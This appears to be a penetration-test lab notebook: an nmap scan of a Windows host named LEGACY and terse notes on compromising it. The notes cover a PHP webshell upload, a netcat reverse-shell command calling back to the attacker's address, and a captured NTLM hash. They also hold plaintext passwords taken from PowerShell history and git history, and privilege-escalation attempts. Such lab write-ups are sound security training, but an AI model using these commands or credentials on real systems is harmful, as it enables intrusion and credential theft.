```
Nmap scan report for 192.168.173.249
Host is up (0.023s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-02-01T20:23:40+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LEGACY
|   NetBIOS_Domain_Name: LEGACY
|   NetBIOS_Computer_Name: LEGACY
|   DNS_Domain_Name: LEGACY
|   DNS_Computer_Name: LEGACY
|   Product_Version: 10.0.20348
|_  System_Time: 2025-02-01T20:23:07+00:00
| ssl-cert: Subject: commonName=LEGACY
| Not valid before: 2025-01-31T20:08:56
|_Not valid after:  2025-08-02T20:08:56
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp  open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.173.249:8000/dashboard/
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/1%OT=80%CT=1%CU=35690%PV=Y%DS=4%DC=T%G=Y%TM=679E8
OS:2CE%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=I%CI=I%TS=A)OPS(O1
OS:=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST1
OS:1%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=
OS:Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%R
OS:D=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%
OS:DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%
OS:O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC
OS:K=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-01T20:23:20
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
-   Hops 1-3 are the same as for 192.168.173.246
4   25.01 ms 192.168.173.249
```

- Uploaded php webshell to http://192.168.133.249:8000/cms/media/shell.pHp?cmd=whoami
- Executed shell with URL: http://192.168.133.249:8000/cms/media/shell.pHp?cmd=dir
- Uploaded nc64.exe and got connect back with nc.exe 192.168.45.173 8888 -e cmd
- found user adrian in Users
- Seimpersonate is enabled but sigmapotato didnt work
- found adrians hash: adrian::LEGACY:1122334455667788:0cdd9029cae616f85973ba4fd355efd5:0101000000000000ab453dc89276db0117554c449b67123500000000080030003000000000000000000000000030000003ad807485e6dfc660531c7b64d93d3427d0566a750da842fbd0e3347d67e6640a00100000000000000000000000000000000000090000000000000000000000
- couldn't crack
- check for tasks
```
    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
```
- Found this in powershell history: echo "Let's check if this script works running as damon and password i6yuT6tym@"
- Found this using git show:
```
-Email configuration of the CMS
-maildmz@relia.com:DPuBT9tGCBrTbR
-
-If something breaks contact jim@relia.com as he is responsible for the mail server.
-Please don't send any office or executable attachments as they get filtered out for security reasons.
```
- Got access via winrm as damon:i6yuT6tym@

COAs:
- ~={yellow}Try godpotatoe=~